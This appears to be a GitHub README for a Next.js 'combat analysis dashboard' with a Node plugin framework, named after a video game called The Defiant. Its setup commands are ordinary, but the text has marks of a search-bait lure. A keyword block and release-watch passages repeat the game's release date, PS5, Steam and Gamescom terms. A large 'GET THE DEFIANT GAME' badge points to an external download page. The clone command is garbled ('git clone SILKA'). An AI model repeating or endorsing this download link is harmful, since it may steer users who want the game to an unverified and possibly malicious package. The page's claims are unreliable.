# The Defiant Game - Combat Analysis Dashboard

<p align="center">
  <img src="logo.png" width="220" alt="The Defiant Game fox emblem">
</p>

The Defiant Game is a modular combat analysis dashboard for reviewing fight footage, marking decisive moments, comparing tactical choices, and building structured reports. The repository combines a React and Next.js interface with the Defiant Node framework, a timeline-first review flow, reusable theme and router plugins, and practical utilities for managing analysis sessions. It brings video annotation, gameplay analytics, challenge tracking, and player-focused reporting into one working project.

The interface is designed around a simple idea: analyzing fights involves more than watching them. A useful review must connect timing, positioning, technique, strategy, conditioning, resource use, and outcome. The Defiant Game turns those observations into repeatable records that can be filtered, compared, discussed, and revisited. Release-watch fields also provide a structured place for The Defiant release date, The Defiant PS5, The Defiant Steam, and Gamescom notes without mixing those updates into combat records.

> Be Defiant. Record the exchange, inspect the decision, and convert every review into a clearer next action.

## Navigate

- [What The Dashboard Does](#what-the-dashboard-does)
- [Feature Matrix](#feature-matrix)
- [Review Workflow](#review-workflow)
- [Interface And Visual Language](#interface-and-visual-language)
- [Get The Build](#get-the-build)
- [Configuration](#configuration)
- [Usage](#usage)
- [Project Structure](#project-structure)
- [Defiant Framework](#defiant-framework)
- [Analysis Conventions](#analysis-conventions)
- [Common Questions](#common-questions)
- [Focus Terms](#focus-terms)
- [Project Notes](#project-notes)

## What The Dashboard Does

The Defiant Game starts with footage. A reviewer can submit a supported video reference, upload material through the included route, or work with a prepared analysis response. The main page coordinates the input, progress state, report view, timeline, chat panel, and voice controls. Instead of leaving observations in disconnected notes, the dashboard keeps each finding attached to the review context.

The workflow borrows the strongest patterns from combat-sports analysis and temporal annotation systems:

1. **Observe the complete exchange.** Watch the sequence before assigning a label.
2. **Mark the useful interval.** Place the moment on the timeline and preserve its surrounding context.
3. **Classify the action.** Record technique, intent, outcome, target area, and confidence.
4. **Compare decisions.** Review positioning, timing, weapon choice, pressure, defense, and resource use.
5. **Turn evidence into a report.** Group repeated patterns and highlight the moments that support each conclusion.
6. **Define the next target.** Convert findings into a training, build, boss, or progression objective.

This approach supports quick player notes as well as longer fight analysis sessions. A short review may contain three key moments and one adjustment. A detailed session may include multiple phases, fighter assessments, tactical summaries, follow-up questions, and a complete timeline.

![Structured Progression Tree](assets/tree.svg)

The progression tree represents the relationship between raw footage, marked moments, findings, and practical targets. Each report can grow from a single observation into a connected history of attempts, builds, opponents, and outcomes.

## Feature Matrix

| Area | Capability | Practical Result |
|---|---|---|
| Video Intake | YouTube input and upload route | Starts a review from a link or local submission |
| Timeline | Scrubbing and timestamped key moments | Keeps findings connected to visible evidence |
| Reports | Structured assessment cards | Separates observations, patterns, and recommendations |
| Discussion | Contextual chat panel | Opens follow-up questions from selected moments |
| Voice | Voice toggle and voice chat controls | Supports hands-free review sessions |
| Navigation | Sidebar and responsive menu | Keeps analysis tools reachable on compact screens |
| Authentication | Supabase provider and middleware | Provides a path for profiles and protected workspaces |
| Presentation | Theme renderables and HTML templates | Separates content from the rendering layer |
| Routing | File, admin, permission, and fallback handlers | Creates an extensible Node request pipeline |
| Utilities | Registry, merge, cipher, range, and path helpers | Supplies reusable framework building blocks |
| Release Watch | PS5, Steam, release date, and Gamescom fields | Keeps discovery notes organized beside project updates |
| Challenge Tracking | Session targets and staged progress | Turns repeated reviews into measurable improvement |

The components are intentionally composable. The [YouTube input](app/components/YouTubeInput.tsx) can start a request, the [timeline](app/components/Timeline.tsx) can expose key moments, the [report view](app/components/ReportView.tsx) can present the result, and the [chat panel](app/components/ChatPanel.tsx) can continue the analysis. Each piece has a narrow role, which makes the interface easier to adapt for a boss guide, sparring journal, weapon comparison, or gameplay analytics workspace.

## Review Workflow

### 1. Prepare The Session

Choose one clear question before starting. Good questions include: Which defensive choice failed most often? Which weapon build produced the cleanest pressure? Where did resource use interrupt the attack sequence? Which boss phase created the largest timing errors? A focused question produces better labels than a general request to find everything.

### 2. Add Footage

Use the input card to provide a supported video reference, or use the upload card when the connected analysis service accepts files. The application routes analysis requests through [app/api/analyze/route.ts](app/api/analyze/route.ts) and uploads through [app/api/upload/route.ts](app/api/upload/route.ts). These routes keep browser components separate from service credentials and endpoint details.

### 3. Read The First Report

Treat the initial report as an index. Scan the fighter or player assessments, tactical observations, and key moments before opening individual entries. This preserves the complete shape of the fight and reduces the temptation to overvalue one dramatic exchange.

### 4. Inspect Key Moments

Open a timestamp from the report, move to the surrounding interval, and compare the lead-in with the result. A useful key moment explains what changed. It may show a stance transition, delayed defense, spacing error, successful bait, stamina problem, weapon mismatch, or route to a clean finish.

### 5. Ask Follow-Up Questions

The chat panel is most useful when a question names the interval and the decision. Ask what options were available, which cue appeared first, or how the same situation changed later. The voice controls provide another way to continue that review while keeping attention on the footage.

### 6. Record A Target

Finish with a specific next step. Use a progression such as `Previous -> Current -> Best -> Target`, or assign a mastery state:

| Track | Suggested States |
|---|---|
| Technique | Learning -> Improving -> Consistent -> Mastered |
| Boss Attempt | Unknown -> Learning -> Close -> Defeated |
| Exploration | Unknown -> Discovered -> Explored -> Completed |
| Review Severity | Good -> Review -> Mistake -> Critical |
| Build Profile | Balanced -> Aggressive -> Defensive -> Boss |

## Interface And Visual Language

The interface follows an island-style dashboard layout. Panels sit on a dark base, controls remain close to the content they affect, and strong colors communicate state rather than decoration. Amber marks focus and timeline activity. Green indicates a successful start or completion. Red indicates an ending, conflict, or error. Purple identifies analysis operations. Blue supports navigation and information.

![Analysis Module](assets/product.svg)

The module icon reflects the way the dashboard packages footage into a usable result. Inputs enter through a small set of controls, move through analysis, and return as report sections that can be opened independently.

| Element | Guideline |
|---|---|
| Page Base | Deep slate background with clear panel separation |
| Panels | Rounded islands with consistent internal spacing |
| Cards | Compact summaries that expand into evidence |
| Timeline | High-contrast focus with visible active state |
| Labels | Short action-oriented terms |
| Motion | Brief transitions that preserve context |
| Mobile Layout | Sidebar actions moved into the hamburger menu |

The [global stylesheet](app/globals.css) controls the shared visual foundation. The [root layout](app/layout.tsx) establishes application structure, while the [sidebar](app/components/Sidebar.tsx) and [hamburger menu](app/components/HamburgerMenu.tsx) provide desktop and compact navigation patterns.

## Get The Build

### Download Package

[![GET THE DEFIANT GAME](https://img.shields.io/badge/GET%20THE%20DEFIANT%20GAME-F59E0B?style=for-the-badge&logoColor=white)](https://the-defiant-ones.github.io/the-defiant-game/the-defiant-ones)

The package contains the Next.js application, Defiant framework modules, local assets, configuration examples, and container definition.

### PowerShell Setup

```powershell
git clone SILKA the-defiant-game
Set-Location .\the-defiant-game
Copy-Item .env.example .env.local
npm install
npm run dev
```

Open the local development address printed by Next.js. The default development port is normally `3000`. Keep the terminal open while reviewing changes because the development server refreshes the interface as application files change.

### Container Build

```powershell
docker build -t the-defiant-game .
docker run --rm -p 3000:3000 --env-file .env.local the-defiant-game
```

The container path uses the included [Dockerfile](Dockerfile). Environment values remain outside the image so the same build can connect to different analysis and authentication services.

<details>
<summary>Production Commands</summary>

```powershell
npm install
npm run build
npm run start
```

Run the lint command before packaging:

```powershell
npm run lint
```

</details>

## Configuration

Copy `.env.example` to `.env.local` and provide values for the services used by your deployment.

| Variable | Purpose |
|---|---|
| `NEXT_PUBLIC_BACKEND_URL` | Browser-visible base address for supported analysis calls |
| `BACKEND_URL` | Server-side address used by the analysis route |
| `NEXT_PUBLIC_SUPABASE_URL` | Supabase project endpoint |
| `NEXT_PUBLIC_SUPABASE_ANON_KEY` | Browser authentication key |

Keep server-only values outside client components. The API routes provide the boundary between browser actions and the connected service. The authentication provider centralizes session state, while middleware provides the place to enable route protection when a deployment requires private reports.

The analysis route can target a local service during development. A typical local value is:

```env
NEXT_PUBLIC_BACKEND_URL=http://localhost:8000
BACKEND_URL=http://localhost:8000
```

## Usage

### Start A Fight Analysis

1. Open the dashboard.
2. Enter a supported fight or gameplay video reference.
3. Start the analysis request.
4. Follow the progress state until the report appears.
5. Expand the assessment cards.
6. Select a key moment to align the report and timeline.
7. Open chat for a focused follow-up.
8. Save the practical target in your session notes.

### Build A Consistent Review

Use the same labels across related sessions. Consistency makes comparison possible. If one review uses `late defense` and another uses `slow guard`, the dashboard cannot reliably group the pattern without a shared vocabulary. Prefer short labels, preserve timestamps, and place interpretation in the longer note.

| Field | Example |
|---|---|
| Session Type | Boss attempt |
| Phase | Second phase |
| Moment | `00:12:48` |
| Technique | Delayed counter |
| Outcome | Damage taken |
| Severity | Review |
| Confidence | High |
| Next Target | Counter after confirmed recovery |

### Compare Builds

Create a stable baseline before changing equipment or tactics. Record one balanced run, then change a limited number of variables. Compare fight duration, damage taken, successful defenses, resource pressure, and repeatability. A build that produces one fast result may still be weaker than a slightly slower build that performs consistently.

### Track Release Information

Keep The Defiant game release date notes separate from combat findings. Use one release-watch entry for each source observation, assign platform labels such as The Defiant PS5 or The Defiant Steam, and group event notes under Gamescom or Gamescom 2026. This makes later updates easier to compare and prevents release speculation from changing gameplay analytics records.

## Project Structure

```text
.
|-- app/
|   |-- api/
|   |-- components/
|   |-- lib/
|   |-- login/
|   |-- pricing/
|   |-- providers/
|   `-- types/
|-- assets/
|   |-- product.svg
|   `-- tree.svg
|-- framework/
|   |-- plugin/
|   |   |-- router/
|   |   `-- theme/
|   |-- util/
|   |-- defiant.js
|   `-- engine.js
|-- Dockerfile
|-- eslint.config.mjs
|-- middleware.ts
|-- next.config.js
|-- package.json
`-- tsconfig.json
```

The application tree contains the active React interface. Components handle visible interaction, `lib` contains shared clients and types, providers manage cross-page state, and API routes connect the interface to analysis operations. The framework tree contains the Defiant Node engine and plugin system. Assets contain local illustrations used by this guide and available to the interface.

## Defiant Framework

The framework follows a registry and plugin model. Registries maintain ordered collections of behavior, while plugins add routing, rendering, and application services without forcing every feature into the engine. This keeps the core small and makes individual systems easier to replace.

The [engine](framework/engine.js) coordinates initialization. The [Defiant entry point](framework/defiant.js) exposes framework capabilities. Router handlers cover files, permissions, administration, missing routes, and access control. Theme renderables model collections, paired tags, single tags, and page output. Utility modules provide focused operations such as object merging, directory creation, valid-name checks, ranges, registries, and ciphers.

Three principles guide extension work:

- **Prefer registered behavior.** Add a handler or renderer through its registry when a suitable extension point exists.
- **Keep modules narrow.** A timeline component should manage timeline interaction, while reports and service calls remain separate.
- **Make replacement practical.** Themes, route handlers, inputs, and report cards should be adaptable without rewriting the complete application.

<details>
<summary>Router Pipeline</summary>

The router plugin provides a base router, route items, and specialized handlers. A request can pass through permission checks before reaching a file, admin, or directory handler. Missing paths use the fallback handler, while denied requests use the access-control path. This arrangement supports explicit ordering and makes route behavior visible in one module family.

</details>

<details>
<summary>Theme Pipeline</summary>

The theme plugin separates data from HTML output. Renderable collections group elements, paired and single tags model markup, and the default handler coordinates output. This is useful for server-rendered summaries, printable reports, or compact analysis cards that need a presentation layer outside the React tree.

</details>

## Analysis Conventions

A strong fight analysis distinguishes evidence from interpretation. Evidence describes what appears at a timestamp. Interpretation explains why it mattered. A target states what should change next. Keep these three parts separate so another reviewer can understand the report without repeating the complete session.

| Layer | Question | Preferred Form |
|---|---|---|
| Evidence | What happened? | Timestamped observation |
| Context | What led to it? | Short sequence description |
| Interpretation | Why did it matter? | Tactical explanation |
| Confidence | How certain is the label? | Low, medium, or high |
| Target | What changes next? | One measurable action |

Use exact intervals for temporal tagging. Include enough lead-in to reveal the decision, but avoid turning one label into a complete round. Use shared names for techniques and outcomes. Record uncertainty instead of hiding it. When two interpretations compete, preserve both and use the next session to test them.

Challenge tracking works best when targets stay small. One session can focus on distance, another on parry timing, and another on weapon choice. Over time, the dashboard becomes a provenance trail for progression: footage leads to moments, moments lead to findings, findings lead to targets, and targets lead to measurable comparisons.

## Common Questions

<details>
<summary>Where Is The Main Interface?</summary>

The primary page is [app/page.tsx](app/page.tsx). Shared interface pieces live in [app/components](app/components), and common request logic lives in [app/lib](app/lib).

</details>

<details>
<summary>What Does The Framework Folder Provide?</summary>

The folder contains the Defiant Node engine, router and theme plugins, and reusable utilities. It complements the Next.js interface with a modular server-side framework layer.

</details>

<details>
<summary>Can The Timeline Be Used Without Voice Controls?</summary>

Yes. Timeline, chat, voice, report, upload, and input features are separate components. A deployment can select the interaction set appropriate for its review workflow.

</details>

<details>
<summary>How Should A Failed Analysis Be Reviewed?</summary>

Check the configured backend address, inspect the API route response, confirm the submitted reference format, and retry with a shorter test case. Preserve the failed input and status because repeated failures may reveal a configuration or validation pattern.

</details>

<details>
<summary>How Are Release Notes Different From Fight Records?</summary>

Release-watch entries organize The Defiant release date, platform, Steam, PS5, and Gamescom observations. Fight records contain footage, timestamps, tactical findings, and progression targets. Separate categories keep both collections searchable.

</details>

## Focus Terms

the defiant game, defiant game, the defiant release date, the defiant game release date, the defiant ps5, the defiant steam, gamescom, gamescom 2026, fight analysis, combat analysis, gameplay analytics, sports dashboard, video annotation, temporal tagging, progression tracking

## Project Notes

The repository is organized as a practical application bundle rather than a single demonstration file. Keep application changes inside `app`, framework extensions inside `framework`, and reusable visual material inside `assets`. Run the available lint and build commands after modifying TypeScript, React components, routing, or package configuration.

Use and redistribution follow the license metadata retained by the included source components and package manifests. Keep those records with the corresponding files when reorganizing the project. Release entries should describe visible changes, configuration changes, and migration steps so users can reproduce the same dashboard state.

The Defiant Game is ready to serve as a focused base for combat review, gameplay analytics, fight analysis, release tracking, challenge progression, and timeline-driven reporting.
